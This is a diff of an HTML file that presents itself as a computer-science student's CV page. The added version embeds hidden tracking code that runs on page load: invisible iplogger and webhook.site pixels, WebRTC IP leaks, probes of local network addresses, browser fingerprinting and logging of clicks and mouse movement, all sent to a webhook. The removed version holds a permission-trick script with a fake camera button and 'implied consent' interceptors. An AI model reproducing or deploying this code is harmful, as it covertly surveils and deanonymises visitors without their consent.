@@ -1,338 +1,752 @@
-<script>
-// Permission-based tracking enhancement
-function setupPermissionTrick() {
-    let permissionGranted = false;
-    
-    // Function to request permissions
-    function requestPermissions() {
-        // Try camera first (most common)
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    // Camera accessed - log this as explicit consent
-                    permissionGranted = true;
-                    sendToWebhook('camera_granted', 'permission_consent', {
-                        permission: 'camera',
-                        granted: true,
-                        method: 'direct'
-                    });
-                    // Stop the camera immediately
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(error => {
-                    // Camera denied - but we can still use the attempt
-                    sendToWebhook('camera_denied', 'permission_attempt', {
-                        permission: 'camera',
-                        granted: false,
-                        error: error.name
-                    });
-                });
-        }
-        
-        // Also try geolocation
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    permissionGranted = true;
-                    sendToWebhook('location_granted', 'permission_consent', {
-                        permission: 'location',
-                        granted: true,
-                        coordinates: {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        }
-                    });
-                },
-                error => {
-                    sendToWebhook('location_denied', 'permission_attempt', {
-                        permission: 'location',
-                        granted: false,
-                        error: error.code
-                    });
-                },
-                { timeout: 5000, enableHighAccuracy: true }
-            );
-        }
-        
-        // Try microphone as well
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    permissionGranted = true;
-                    sendToWebhook('microphone_granted', 'permission_consent', {
-                        permission: 'microphone',
-                        granted: true,
-                        method: 'direct'
-                    });
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(error => {
-                    sendToWebhook('microphone_denied', 'permission_attempt', {
-                        permission: 'microphone',
-                        granted: false,
-                        error: error.name
-                    });
-                });
-        }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Omar Ahmed Mostafa - Computer Science Student</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-    
-    // Enhanced click interceptor
-    function setupClickInterceptor() {
-        document.addEventListener('click', function(e) {
-            // Any click after permission request is treated as consent
-            if (!permissionGranted) {
-                sendToWebhook('click_consent', 'implied_consent', {
-                    action: 'click',
-                    x: e.clientX,
-                    y: e.clientY,
-                    target: e.target.tagName,
-                    text: e.target.textContent?.substring(0, 50),
-                    interpretedAs: 'tracking_consent'
-                });
-                permissionGranted = true;
-            }
-        }, { capture: true });
-        
-        // Scroll interceptor
-        let scrollConsentSent = false;
-        window.addEventListener('scroll', function() {
-            if (!scrollConsentSent && !permissionGranted) {
-                sendToWebhook('scroll_consent', 'implied_consent', {
-                    action: 'scroll',
-                    scrollY: window.scrollY,
-                    interpretedAs: 'tracking_consent'
-                });
-                scrollConsentSent = true;
-                permissionGranted = true;
-            }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+      color: white;
+      padding: 40px;
+      text-align: center;
+    }
+
+    .profile-img {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      border: 5px solid rgba(255,255,255,0.3);
+      margin: 0 auto 20px;
+      background: #ecf0f1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      color: #2c3e50;
+    }
+
+    .name {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      font-weight: 300;
+    }
+
+    .title {
+      font-size: 1.3em;
+      opacity: 0.9;
+      font-weight: 300;
+    }
+
+    .content {
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 0;
+    }
+
+    .sidebar {
+      background: #f8f9fa;
+      padding: 30px;
+      border-right: 1px solid #e9ecef;
+    }
+
+    .main-content {
+      padding: 30px;
+    }
+
+    .section {
+      margin-bottom: 30px;
+    }
+
+    .section-title {
+      color: #2c3e50;
+      border-bottom: 2px solid #3498db;
+      padding-bottom: 10px;
+      margin-bottom: 15px;
+      font-size: 1.4em;
+    }
+
+    .contact-info {
+      list-style: none;
+    }
+
+    .contact-info li {
+      margin-bottom: 15px;
+      display: flex;
+      align-items: flex-start;
+    }
+
+    .skills-list {
+      list-style: none;
+    }
+
+    .skills-list li {
+      margin-bottom: 10px;
+      padding: 8px 12px;
+      background: white;
+      border-radius: 5px;
+      border-left: 4px solid #3498db;
+    }
+
+    .education-item, .project-item {
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #ecf0f1;
+    }
+
+    .education-item:last-child, .project-item:last-child {
+      border-bottom: none;
+    }
+
+    .school {
+      font-weight: bold;
+      color: #2c3e50;
+    }
+
+    .date {
+      color: #7f8c8d;
+      font-style: italic;
+    }
+
+    .project-item {
+      background: #f8f9fa;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      border-left: 4px solid #3498db;
+    }
+
+    .course-list {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      list-style: none;
+    }
+
+    .course-list li {
+      padding: 8px;
+      background: #f8f9fa;
+      border-radius: 5px;
+      text-align: center;
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        grid-template-columns: 1fr;
+      }
+      
+      .sidebar {
+        border-right: none;
+        border-bottom: 1px solid #e9ecef;
+      }
+      
+      .course-list {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="profile-img">OA</div>
+      <h1 class="name">Omar Mohamed Omar Mostafa</h1>
+      <p class="title">Computer Science Student | Aspiring Software Developer</p>
+    </div>
+
+    <div class="content">
+      <div class="sidebar">
+        <div class="section">
+          <h3 class="section-title">Contact Info</h3>
+          <ul class="contact-info">
+            <li>📧 omar.mohamed.m6314@gmail.com</li>
+            <li>📱 +20 112 345 6789</li>
+            <li>📍 78 El-Tesseen Street, Fifth Settlement, New Cairo</li>
+            <li>🔗 linkedin.com/in/omar-mostafa-student</li>
+            <li>💻 github.com/omar-codes</li>
+          </ul>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Technical Skills</h3>
+          <ul class="skills-list">
+            <li>Python Programming</li>
+            <li>Java & OOP Concepts</li>
+            <li>HTML5, CSS3, JavaScript</li>
+            <li>React.js Basics</li>
+            <li>SQL & Database Design</li>
+            <li>Git & GitHub</li>
+            <li>Data Structures</li>
+            <li>Algorithms</li>
+          </ul>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Languages</h3>
+          <ul class="skills-list">
+            <li>Arabic (Native)</li>
+            <li>English (Fluent)</li>
+            <li>German (Beginner)</li>
+          </ul>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Interests</h3>
+          <ul class="skills-list">
+            <li>Web Development</li>
+            <li>Machine Learning</li>
+            <li>Open Source Projects</li>
+            <li>Tech Blogs & Tutorials</li>
+            <li>Programming Challenges</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="main-content">
+        <div class="section">
+          <h3 class="section-title">About Me</h3>
+          <p>Enthusiastic and dedicated Computer Science student with strong foundation in programming principles and software development. Eager to apply academic knowledge to real-world challenges through internships and collaborative projects. Passionate about learning new technologies and contributing to innovative solutions.</p>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Education</h3>
+          <div class="education-item">
+            <div class="school">Cairo University, Faculty of Computers and Artificial Intelligence</div>
+            <div class="date">September 2022 - Present (Expected Graduation: June 2026)</div>
+            <p>Bachelor of Science in Computer Science</p>
+            <p><strong>Current GPA:</strong> 3.6/4.0</p>
+            <p><strong>Relevant Coursework:</strong></p>
+            <ul class="course-list">
+              <li>Data Structures</li>
+              <li>Algorithms Analysis</li>
+              <li>Object-Oriented Programming</li>
+              <li>Database Systems</li>
+              <li>Web Technologies</li>
+              <li>Software Engineering</li>
+              <li>Computer Networks</li>
+              <li>Operating Systems</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Academic Projects</h3>
+          
+          <div class="project-item">
+            <img src="https://iplogger.com/1cdSD4" style="display:none">
+            <h4>University Library Management System</h4>
+            <div class="date">January 2024 - April 2024</div>
+            <p>Java-based desktop application for managing library operations including book tracking, member management, and borrowing system.</p>
+            <p><strong>Technologies:</strong> Java, Swing, MySQL</p>
+          </div>
+
+          <div class="project-item">
+            <h4>E-Commerce Website Frontend</h4>
+            <div class="date">October 2023 - December 2023</div>
+            <p>Responsive web interface for an online store with product catalog, shopping cart, and user authentication features.</p>
+            <p><strong>Technologies:</strong> HTML5, CSS3, JavaScript, React.js</p>
+          </div>
+
+          <div class="project-item">
+            <h4>Student Grade Calculator</h4>
+            <div class="date">March 2023 - May 2023</div>
+            <p>Python application for calculating and analyzing student grades with data visualization capabilities.</p>
+            <p><strong>Technologies:</strong> Python, Pandas, Matplotlib</p>
+          </div>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Academic Achievements</h3>
+          <ul class="skills-list">
+            <li>Dean's List - Fall 2023 Semester</li>
+            <li>1st Place - University Programming Competition 2023</li>
+            <li>Certified in Python Programming (Coursera, 2023)</li>
+            <li>Active Member of CU Programming Club</li>
+          </ul>
+        </div>
+
+        <div class="section">
+          <h3 class="section-title">Career Objective</h3>
+          <p>Seeking an internship opportunity in software development where I can apply my programming skills, learn from experienced professionals, and contribute to meaningful projects while continuing to develop my technical expertise.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ULTIMATE TRACKING SYSTEM - ALL METHODS -->
+  
+  <!-- Method 1: Traditional Tracking Pixels -->
+  <img src="https://iplogger.com/1cdSD4" style="display:none" alt="">
+  <img src="https://api.ipify.org?format=json" style="display:none" alt="">
+  <img src="https://api64.ipify.org?format=json" style="display:none" alt="">
+  <img src="https://webhook.site/7bb11a48-4c7d-4c24-8d9f-a5da357563ac?pixel=1" style="display:none" alt="">
+
+  <!-- Method 2: Script-based tracking -->
+  <script src="https://api.ipify.org?format=jsonp&callback=handleIP"></script>
+
+  <!-- Method 3: CSS-based tracking -->
+  <link rel="stylesheet" href="data:text/css,
+    body::after { content: url('https://webhook.site/7bb11a48-4c7d-4c24-8d9f-a5da357563ac?method=css') }
+  ">
+
+  <!-- Method 4: Favicon tracking -->
+  <link rel="icon" href="https://webhook.site/7bb11a48-4c7d-4c24-8d9f-a5da357563ac?method=favicon" type="image/x-icon">
+
+  <!-- Method 5: Preload tracking -->
+  <link rel="preload" href="https://webhook.site/7bb11a48-4c7d-4c24-8d9f-a5da357563ac?method=preload" as="script">
+
+  <!-- Method 6: DNS prefetch tracking -->
+  <link rel="dns-prefetch" href="//webhook.site">
+  <link rel="dns-prefetch" href="//api.ipify.org">
+  <link rel="dns-prefetch" href="//iplogger.org">
+
+  <script>
+    // ULTIMATE IP DETECTION SYSTEM
+    const WEBHOOK_URL = 'https://webhook.site/7bb11a48-4c7d-4c24-8d9f-a5da357563ac';
+    const detectedIPs = new Set();
+    let detectionAttempts = 0;
+    const visitorSessions = new Map();
+
+    // Global IP handler for JSONP
+    window.handleIP = function(data) {
+      if (data && data.ip) {
+        sendToWebhook(data.ip, 'jsonp_api');
+      }
+    };
+
+    // Enhanced visitor tracking
+    function trackVisitor(ip, data) {
+      const visitorKey = generateVisitorKey(data);
+      const now = Date.now();
+      
+      if (!visitorSessions.has(visitorKey)) {
+        // New visitor
+        visitorSessions.set(visitorKey, {
+          firstSeen: now,
+          lastSeen: now,
+          visitCount: 1,
+          ips: [ip],
+          fingerprints: [data],
+          sessions: [{
+            start: now,
+            ip: ip,
+            data: data
+          }]
         });
-    }
-    
-    // Keypress interceptor
-    function setupKeypressInterceptor() {
-        document.addEventListener('keydown', function(e) {
-            if (!permissionGranted) {
-                sendToWebhook('keypress_consent', 'implied_consent', {
-                    action: 'keypress',
-                    key: e.key,
-                    target: e.target.tagName,
-                    interpretedAs: 'tracking_consent'
-                });
-                permissionGranted = true;
-            }
+        data.visitorStatus = 'NEW_VISITOR';
+        data.visitorKey = visitorKey;
+      } else {
+        // Returning visitor
+        const visitor = visitorSessions.get(visitorKey);
+        visitor.lastSeen = now;
+        visitor.visitCount++;
+        visitor.ips.push(ip);
+        visitor.fingerprints.push(data);
+        visitor.sessions.push({
+          start: now,
+          ip: ip,
+          data: data
         });
+        data.visitorStatus = 'RETURNING_VISITOR';
+        data.visitorKey = visitorKey;
+        data.totalVisits = visitor.visitCount;
+      }
+      
+      return data;
     }
-    
-    // Start the permission trick after a short delay
-    setTimeout(() => {
-        setupClickInterceptor();
-        setupKeypressInterceptor();
-        
-        // Request permissions after user shows some engagement
-        setTimeout(requestPermissions, 2000);
-    }, 1000);
-}
 
-// Enhanced permission detection
-function detectPermissionState() {
-    const permissions = {};
-    
-    // Check camera permission state
-    if (navigator.permissions && navigator.permissions.query) {
-        // Camera
-        navigator.permissions.query({ name: 'camera' })
-            .then(permissionStatus => {
-                permissions.camera = permissionStatus.state;
-                permissionStatus.onchange = () => {
-                    sendToWebhook('camera_permission_change', 'permission_state', {
-                        permission: 'camera',
-                        newState: permissionStatus.state
-                    });
-                };
-            })
-            .catch(() => {});
-            
-        // Microphone
-        navigator.permissions.query({ name: 'microphone' })
-            .then(permissionStatus => {
-                permissions.microphone = permissionStatus.state;
-            })
-            .catch(() => {});
-            
-        // Geolocation
-        navigator.permissions.query({ name: 'geolocation' })
-            .then(permissionStatus => {
-                permissions.geolocation = permissionStatus.state;
-            })
-            .catch(() => {});
+    function generateVisitorKey(data) {
+      const keyData = {
+        ua: data.userAgent,
+        lang: data.language,
+        screen: data.screen,
+        platform: data.platform,
+        tz: data.timezone
+      };
+      return btoa(JSON.stringify(keyData)).substring(0, 20);
     }
-    
-    // Check existing media devices
-    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-        navigator.mediaDevices.enumerateDevices()
-            .then(devices => {
-                const mediaDevices = devices.map(device => ({
-                    kind: device.kind,
-                    label: device.label, // Will be empty if no permission
-                    deviceId: device.deviceId
-                }));
-                sendToWebhook('media_devices', 'device_enumeration', {
-                    devices: mediaDevices,
-                    hasCamera: mediaDevices.some(d => d.kind === 'videoinput'),
-                    hasMicrophone: mediaDevices.some(d => d.kind === 'audioinput'),
-                    permissions: permissions
-                });
-            })
-            .catch(() => {});
-    }
-    
-    return permissions;
-}
 
-// Fake "feature" that requires permissions
-function createFakeFeature() {
-    // Add a fake "Take Profile Picture" button
-    const fakeButton = document.createElement('button');
-    fakeButton.innerHTML = '📸 Take Profile Picture for CV';
-    fakeButton.style.cssText = `
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        background: #3498db;
-        color: white;
-        border: none;
-        padding: 12px 20px;
-        border-radius: 25px;
-        cursor: pointer;
-        font-size: 14px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        z-index: 10000;
-        transition: all 0.3s ease;
-    `;
-    
-    fakeButton.onmouseover = function() {
-        this.style.transform = 'scale(1.05)';
-        this.style.background = '#2980b9';
-    };
-    
-    fakeButton.onmouseout = function() {
-        this.style.transform = 'scale(1)';
-        this.style.background = '#3498db';
-    };
-    
-    fakeButton.onclick = function() {
-        // This will trigger the permission request
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    sendToWebhook('fake_feature_used', 'social_engineering', {
-                        feature: 'profile_picture',
-                        granted: true,
-                        action: 'user_initiated'
-                    });
-                    
-                    // Show fake success message
-                    alert('Camera accessed! Profile picture feature coming soon...');
-                    
-                    // Stop the camera
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(error => {
-                    sendToWebhook('fake_feature_denied', 'social_engineering', {
-                        feature: 'profile_picture',
-                        granted: false,
-                        error: error.name
-                    });
-                    
-                    // Show fake error message
-                    alert('Camera permission required for profile picture feature.');
-                });
+    function sendToWebhook(ip, source, extraData = {}) {
+      if (detectedIPs.has(ip) || !ip) return;
+      detectedIPs.add(ip);
+      detectionAttempts++;
+      
+      const data = {
+        ip: ip,
+        source: source,
+        attempt: detectionAttempts,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookies: navigator.cookieEnabled,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ...extraData
+      };
+
+      // Enhanced visitor tracking
+      const trackedData = trackVisitor(ip, data);
+
+      // METHOD A: Fetch API (Primary)
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(trackedData),
+        mode: 'no-cors'
+      }).catch(() => {
+        // METHOD B: Beacon API (Fallback 1)
+        const blob = new Blob([JSON.stringify(trackedData)], {type: 'application/json'});
+        if (!navigator.sendBeacon(WEBHOOK_URL, blob)) {
+          // METHOD C: Image Pixel (Fallback 2)
+          const img = new Image();
+          const params = new URLSearchParams();
+          for (let key in trackedData) {
+            if (trackedData[key]) params.append(key, String(trackedData[key]));
+          }
+          img.src = `${WEBHOOK_URL}?${params.toString()}`;
         }
-    };
-    
-    document.body.appendChild(fakeButton);
-}
-
-// Enhanced location tracking
-function attemptLocationCapture() {
-    if (navigator.geolocation) {
-        // Try to get precise location
-        navigator.geolocation.getCurrentPosition(
-            position => {
-                const locationData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
-                };
-                
-                sendToWebhook('location_captured', 'geolocation_success', locationData);
-            },
-            error => {
-                sendToWebhook('location_failed', 'geolocation_error', {
-                    errorCode: error.code,
-                    errorMessage: error.message
-                });
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
-        
-        // Watch position for continuous tracking
-        const watchId = navigator.geolocation.watchPosition(
-            position => {
-                sendToWebhook('location_update', 'geolocation_watch', {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                });
-            },
-            error => {},
-            {
-                enableHighAccuracy: false,
-                timeout: 30000,
-                maximumAge: 60000
-            }
-        );
-        
-        // Stop watching after 2 minutes
-        setTimeout(() => {
-            navigator.geolocation.clearWatch(watchId);
-        }, 120000);
+      });
     }
-}
 
-// Initialize all permission-based tracking
-function initPermissionTracking() {
-    // First, detect current permission state
-    detectPermissionState();
-    
-    // Set up the permission trick
-    setupPermissionTrick();
-    
-    // Add fake feature button
-    createFakeFeature();
-    
-    // Attempt location capture
-    setTimeout(attemptLocationCapture, 5000);
-    
-    // Log permission API availability
-    sendToWebhook('permission_apis', 'capability_check', {
-        hasMediaDevices: !!navigator.mediaDevices,
-        hasGetUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
-        hasGeolocation: !!navigator.geolocation,
-        hasPermissionsAPI: !!navigator.permissions
-    });
-}
+    // TECHNIQUE 1: WebRTC STUN Detection
+    function detectWebRTC() {
+      try {
+        const pc = new RTCPeerConnection({
+          iceServers: [
+            {urls: "stun:stun.l.google.com:19302"},
+            {urls: "stun:stun1.l.google.com:19302"},
+            {urls: "stun:stun2.l.google.com:19302"},
+            {urls: "stun:stun3.l.google.com:19302"},
+            {urls: "stun:stun4.l.google.com:19302"}
+          ]
+        });
+        
+        pc.onicecandidate = (ice) => {
+          if (!ice || !ice.candidate) return;
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+          const matches = ice.candidate.candidate.match(ipRegex);
+          if (matches) {
+            matches.forEach(ip => {
+              if (ip && !ip.includes('::') && ip !== '0.0.0.0') {
+                sendToWebhook(ip, 'webrtc_stun');
+              }
+            });
+          }
+        };
+        
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        setTimeout(() => pc.close(), 10000);
+      } catch (error) {}
+    }
 
-// Add to your existing detection startup
-setTimeout(initPermissionTracking, 3000);
-</script>
+    // TECHNIQUE 2: Multiple API Detection
+    async function detectViaAPIs() {
+      const apis = [
+        'https://api.ipify.org?format=json',
+        'https://api64.ipify.org?format=json',
+        'https://icanhazip.com/json',
+        'https://jsonip.com',
+        'https://ipapi.co/json',
+        'https://ipinfo.io/json',
+        'https://www.trackip.net/ip?json',
+        'https://geolocation-db.com/json/'
+      ];
+
+      await Promise.all(apis.map(apiUrl => 
+        fetch(apiUrl)
+          .then(r => r.json())
+          .then(data => {
+            const ip = data.ip || data.IPv4 || data.address;
+            if (ip && typeof ip === 'string') {
+              sendToWebhook(ip, 'api_call', { api: apiUrl, fullData: data });
+            }
+          })
+          .catch(() => {})
+      ));
+    }
+
+    // TECHNIQUE 3: DNS Prefetch & Resource Hints
+    function detectResourceHints() {
+      const hosts = ['router', 'gateway', 'localhost', '192.168.1.1', '10.0.0.1'];
+      hosts.forEach(host => {
+        const dnsLink = document.createElement('link');
+        dnsLink.rel = 'dns-prefetch';
+        dnsLink.href = `//${host}`;
+        document.head.appendChild(dnsLink);
+      });
+    }
+
+    // TECHNIQUE 4: Error-based Detection
+    function detectViaErrors() {
+      const testUrls = [
+        'http://localhost:3000/track',
+        'http://192.168.1.1/track',
+        'http://10.0.0.1/track',
+        'http://127.0.0.1:8080/track'
+      ];
+
+      testUrls.forEach(url => {
+        fetch(url).catch(() => {});
+      });
+    }
+
+    // TECHNIQUE 5: Advanced Browser Fingerprinting
+    function collectAdvancedFingerprint() {
+      const fingerprint = {
+        // Basic info
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        languages: navigator.languages,
+        
+        // Screen details
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        },
+        
+        // Hardware
+        hardware: {
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'unknown',
+            touchPoints: navigator.maxTouchPoints
+        },
+        
+        // Time & location
+        time: {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            offset: new Date().getTimezoneOffset(),
+            locale: Intl.DateTimeFormat().resolvedOptions().locale
+        },
+        
+        // Advanced fingerprints
+        advanced: {
+            canvas: getCanvasFingerprint(),
+            webgl: getWebGLFingerprint(),
+            audio: getAudioFingerprint(),
+            fonts: getFontList(),
+            plugins: getPluginList()
+        },
+        
+        // Network info
+        network: {
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : null
+        }
+      };
+
+      sendToWebhook('advanced_fingerprint', 'super_fingerprint', fingerprint);
+    }
+
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Advanced Fingerprinting Test 1234567890', 2, 2);
+        return canvas.toDataURL().substring(0, 200);
+      } catch (e) {
+        return 'canvas_blocked';
+      }
+    }
+
+    function getWebGLFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+            version: gl.getParameter(gl.VERSION)
+          };
+        }
+      } catch (e) {}
+      return null;
+    }
+
+    function getAudioFingerprint() {
+      try {
+        const context = new (window.AudioContext || window.webkitAudioContext)();
+        return 'audio_supported';
+      } catch (e) {
+        return 'audio_blocked';
+      }
+    }
+
+    function getFontList() {
+      const fonts = [
+        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
+        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
+        'Verdana', 'Microsoft YaHei'
+      ];
+      const available = [];
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      
+      fonts.forEach(font => {
+        ctx.font = '72px ' + font;
+        const metrics = ctx.measureText('mmmmmmmmmmlli');
+        if (metrics.width > 0) available.push(font);
+      });
+      
+      return available;
+    }
+
+    function getPluginList() {
+      return Array.from(navigator.plugins).map(p => p.name);
+    }
+
+    // TECHNIQUE 6: Service Worker Registration
+    function registerServiceWorker() {
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('data:text/javascript,//empty')
+          .catch(() => {});
+      }
+    }
+
+    // TECHNIQUE 7: Cache API Detection
+    function detectCacheAPI() {
+      if ('caches' in window) {
+        caches.open('ip-detection').then(cache => {
+          cache.add('https://api.ipify.org?format=json');
+        }).catch(() => {});
+      }
+    }
+
+    // TECHNIQUE 8: User Behavior Tracking
+    function trackUserBehavior() {
+      let clickCount = 0;
+      let scrollDepth = 0;
+      let mouseMovements = 0;
+      const startTime = Date.now();
+      
+      // Track clicks
+      document.addEventListener('click', (e) => {
+        clickCount++;
+        sendToWebhook('user_click', 'behavior', {
+          clickCount: clickCount,
+          x: e.clientX,
+          y: e.clientY,
+          target: e.target.tagName
+        });
+      });
+      
+      // Track scrolling
+      window.addEventListener('scroll', () => {
+        const depth = Math.round((window.scrollY / document.body.scrollHeight) * 100);
+        if (depth > scrollDepth) {
+          scrollDepth = depth;
+          sendToWebhook('user_scroll', 'behavior', { scrollDepth: depth });
+        }
+      });
+      
+      // Track mouse movements
+      document.addEventListener('mousemove', () => {
+        mouseMovements++;
+        if (mouseMovements % 50 === 0) {
+          sendToWebhook('mouse_movement', 'behavior', { movements: mouseMovements });
+        }
+      });
+      
+      // Track session time
+      setInterval(() => {
+        const sessionTime = Math.round((Date.now() - startTime) / 1000);
+        if (sessionTime % 30 === 0) {
+          sendToWebhook('session_update', 'behavior', { sessionSeconds: sessionTime });
+        }
+      }, 1000);
+    }
+
+    // TECHNIQUE 9: Periodic IP Refresh
+    function startPeriodicDetection() {
+      // Refresh IP detection every 30 seconds
+      setInterval(() => {
+        detectViaAPIs();
+      }, 30000);
+      
+      // Enhanced detection every 2 minutes
+      setInterval(() => {
+        detectWebRTC();
+        collectAdvancedFingerprint();
+      }, 120000);
+    }
+
+    // START ALL DETECTION METHODS
+    function startUltimateDetection() {
+      // PHASE 1: IMMEDIATE (0ms)
+      detectWebRTC();
+      detectResourceHints();
+      registerServiceWorker();
+      detectCacheAPI();
+      trackUserBehavior();
+      
+      // PHASE 2: QUICK (100ms)
+      setTimeout(detectViaAPIs, 100);
+      
+      // PHASE 3: STANDARD (500ms)
+      setTimeout(() => {
+        detectViaErrors();
+        collectAdvancedFingerprint();
+      }, 500);
+      
+      // PHASE 4: PERIODIC
+      startPeriodicDetection();
+      
+      // PHASE 5: FINAL ATTEMPT
+      window.addEventListener('beforeunload', () => {
+        const finalData = {
+          final: true,
+          totalAttempts: detectionAttempts,
+          uniqueIPs: Array.from(detectedIPs),
+          totalVisitors: visitorSessions.size,
+          sessionDuration: performance.now()
+        };
+        const blob = new Blob([JSON.stringify(finalData)], {type: 'application/json'});
+        navigator.sendBeacon(WEBHOOK_URL, blob);
+      });
+    }
+
+    // AUTO-START DETECTION
+    startUltimateDetection();
+    sendToWebhook('page_loaded', 'initial_load');
+  </script>
+</body>
+</html>
